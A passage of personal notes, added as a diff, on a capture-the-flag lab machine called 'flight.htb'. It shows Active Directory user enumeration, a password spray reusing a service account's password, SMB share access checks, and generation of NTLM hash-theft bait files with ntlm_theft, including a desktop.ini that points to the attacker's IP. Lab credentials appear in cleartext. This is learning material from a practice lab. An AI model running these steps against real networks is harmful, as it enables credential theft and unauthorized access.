@@ -557,3 +557,152 @@ Impacket v0.13.0.dev0+20251002.85540.fc92f471 - Copyright Fortra, LLC and its af
 ```
 
 with a list of valid usernames, try a password spray against the usernames to see if the password for svc_apache is re-used.
+
+
+![[impacket-getADusers.png]]
+
+```
+impacket-GetADUsers -all -dc-ip flight.htb flight.htb/svc_apache:'S@Ss!K@*t13' | cut -d " " -f 1 | grep -Ev 'Name|Impacket|\-\-|\[' 
+
+Administrator
+Guest
+krbtgt
+S.Moon
+R.Cold
+G.Lors
+L.Kein
+M.Gold
+C.Bum
+W.Walker
+I.Francis
+D.Truff
+V.Stevens
+svc_apache
+O.Possum
+
+```
+
+```
+
+nano flight-AD-names.txt
+
+┌──(lanc3㉿kali)-[~]
+└─$ cat /etc/hosts     
+
+10.129.228.120 flight.htb school.flight.htb
+
+┌──(lanc3㉿kali)-[~]
+└─$ cat flight-AD-names.txt 
+Administrator
+Guest
+krbtgt
+S.Moon
+R.Cold
+G.Lors
+L.Kein
+M.Gold
+C.Bum
+W.Walker
+I.Francis
+D.Truff
+V.Stevens
+svc_apache
+O.Possum
+
+┌──(lanc3㉿kali)-[~]
+└─$ nxc smb flight.htb -u flight-AD-names.txt -p 'S@Ss!K@*t13'
+```
+
+![[smoon.png]]
+
+flight.htb\S.Moon:S@Ss!K@*t13 
+
+now checking S.Moon smb privileges compared to svc_apache
+
+![[svc_apache-permissions.png]]
+
+found that smbmap not reliable, maybe it's version issue. 
+
+![[smbmap-vs-nxc.png]]
+
+nxc smb --share shows S.Moon has write access to Shared
+
+smbmap didn't show that (for me, checked walkthroughs, working for them)
+
+-----
+
+```
+smbclient //10.129.228.120/Shared -U 'S.Moon%S@Ss!K@*t13' 
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                   D        0  Mon May  4 22:05:51 2026
+  ..                                  D        0  Mon May  4 22:05:51 2026
+
+                5056511 blocks of size 4096. 1254162 blocks available
+smb: \> 
+
+```
+
+-----
+
+```
+git clone https://github.com/Greenwolf/ntlm_theft
+Cloning into 'ntlm_theft'...
+remote: Enumerating objects: 151, done.
+remote: Counting objects: 100% (38/38), done.
+remote: Compressing objects: 100% (14/14), done.
+remote: Total 151 (delta 31), reused 24 (delta 24), pack-reused 113 (from 1)
+Receiving objects: 100% (151/151), 2.12 MiB | 1.77 MiB/s, done.
+Resolving deltas: 100% (73/73), done.
+
+┌──(lanc3㉿kali)-[~]
+└─$ cd ntlm_theft                                  
+
+┌──(lanc3㉿kali)-[~/ntlm_theft]
+└─$ python3 ntlm_theft.py --generate all --server 10.10.14.67 --filename lanc3-ntlm
+/home/lanc3/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence '\l'
+  location.href = 'ms-word:ofe|u|\\''' + server + '''\leak\leak.docx';
+Created: lanc3-ntlm/lanc3-ntlm.scf (BROWSE TO FOLDER)
+Created: lanc3-ntlm/lanc3-ntlm-(url).url (BROWSE TO FOLDER)
+Created: lanc3-ntlm/lanc3-ntlm-(icon).url (BROWSE TO FOLDER)
+Created: lanc3-ntlm/lanc3-ntlm.lnk (BROWSE TO FOLDER)
+Created: lanc3-ntlm/lanc3-ntlm.rtf (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm-(stylesheet).xml (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm-(fulldocx).xml (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: lanc3-ntlm/lanc3-ntlm-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: lanc3-ntlm/lanc3-ntlm-(includepicture).docx (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm-(remotetemplate).docx (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm-(frameset).docx (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm-(externalcell).xlsx (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm.wax (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: lanc3-ntlm/lanc3-ntlm.asx (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm.jnlp (OPEN)
+Created: lanc3-ntlm/lanc3-ntlm.application (DOWNLOAD AND OPEN)
+Created: lanc3-ntlm/lanc3-ntlm.pdf (OPEN AND ALLOW)
+Created: lanc3-ntlm/zoom-attack-instructions.txt (PASTE TO CHAT)
+Created: lanc3-ntlm/lanc3-ntlm.library-ms (BROWSE TO FOLDER)
+Created: lanc3-ntlm/Autorun.inf (BROWSE TO FOLDER)
+Created: lanc3-ntlm/desktop.ini (BROWSE TO FOLDER)
+Created: lanc3-ntlm/lanc3-ntlm.theme (THEME TO INSTALL
+Generation Complete.
+
+
+
+```
+
+upload all the files that have the (BROWSE TO FOLDER) requirement to the Shared share
+
+----
+
+why it didn't work
+
+```
+cat lanc3-ntlm/desktop.ini           
+[.ShellClassInfo]
+IconResource=\\10.10.14.67\aa 
+
+```
+
+IP is wrong, should be my kali IP
